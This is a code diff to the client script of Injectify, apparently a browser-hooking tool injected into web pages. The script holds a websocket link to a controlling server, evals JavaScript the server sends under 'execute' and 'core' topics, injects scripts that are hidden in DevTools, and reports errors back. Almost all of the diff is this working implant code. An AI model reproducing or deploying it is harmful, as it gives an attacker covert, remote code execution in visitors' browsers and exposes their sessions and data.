@@ -6,16 +6,29 @@ window['injectify'] = /** @class */ (function () {
     function Injectify() {
     }
     /**
-     * Listen for a topic from websocket connection
-     * @param {string} topic Topic name to listen to
-     * @param {function} callback Callback to be triggered once topic received
+     * Overrides the message handler for the websocket connection
+     * @param {function} callback Callback to be triggered once message received
      */
-    Injectify.listen = function (topic, callback) {
+    Injectify.listener = function (callback) {
         var _this = this;
         ws.onmessage = function (message) {
             try {
                 var data = JSON.parse(message.data);
-                if (topic == data.t || topic == '*') {
+                if (_this['listeners'] && data.t && _this['listeners'][data.t]) {
+                    /**
+                     * Pre-process some topic's data
+                     */
+                    if (data.t == 'pong') {
+                        data.d = +new Date - data.d;
+                    }
+                    /**
+                     * Callback the listeners
+                     */
+                    _this['listeners'][data.t].callback(data.d);
+                    if (_this['listeners'][data.t].once)
+                        delete _this['listeners'][data.t];
+                }
+                else {
                     callback(data.d, data.t);
                 }
             }
@@ -25,6 +38,39 @@ window['injectify'] = /** @class */ (function () {
                 _this.send('e', e.stack);
             }
         };
+    };
+    /**
+     * Listen for a topic from websocket connection
+     * @param {string} topic Topic name to listen to
+     * @param {function} callback Callback to be triggered once topic received
+     */
+    Injectify.listen = function (topic, callback, once) {
+        if (!once)
+            once = false;
+        if (!this['listeners'])
+            this['listeners'] = {};
+        this['listeners'][topic] = {
+            callback: function (data) {
+                callback(data);
+            },
+            raw: callback,
+            once: once
+        };
+    };
+    /**
+     * Unhook a websocket topic listener
+     * @param {string} topic Topic name to unlisten
+     * @param {function} callback
+     */
+    Injectify.unlisten = function (topic, callback) {
+        if (!this['listeners'] ||
+            !this['listeners'][topic] ||
+            !this['listeners'][topic].callback ||
+            !this['listeners'][topic].raw ||
+            (callback &&
+                callback.toString() !== this['listeners'][topic].raw.toString()))
+            return false;
+        return delete this['listeners'][topic];
     };
     /**
      * Send data to websocket
@@ -64,7 +110,7 @@ window['injectify'] = /** @class */ (function () {
     Injectify.ping = function (callback) {
         this.send('ping', +new Date());
         if (callback)
-            this.listen('pong', callback);
+            this.listen('pong', callback, true);
     };
     /**
      * Safely execute a script with hidden context. Appears as 'VMXXX:1' in DevTools
@@ -74,6 +120,8 @@ window['injectify'] = /** @class */ (function () {
     Injectify.exec = function (func, targetParent) {
         if (!targetParent)
             targetParent = document.head;
+        if (typeof func == 'function')
+            func = '(' + func.toString() + ')()';
         var script = document.createElement('script');
         script.innerHTML = func;
         targetParent.appendChild(script);
@@ -148,7 +196,7 @@ if (window['injectify'].debug) {
 /**
  * Replace the basic websocket handler with a feature-rich one
  */
-window['injectify'].listen('*', function (data, topic) {
+window['injectify'].listener(function (data, topic) {
     try {
         if (topic == 'error') {
             console.error(data);
@@ -164,7 +212,9 @@ window['injectify'].listen('*', function (data, topic) {
             delete window["callbackFor" + Module];
             return;
         }
-        eval(data);
+        if (topic == 'execute' || topic == 'core') {
+            eval(data);
+        }
     }
     catch (e) {
         //if (JSON.stringify(e) == "{}") e = e.stack
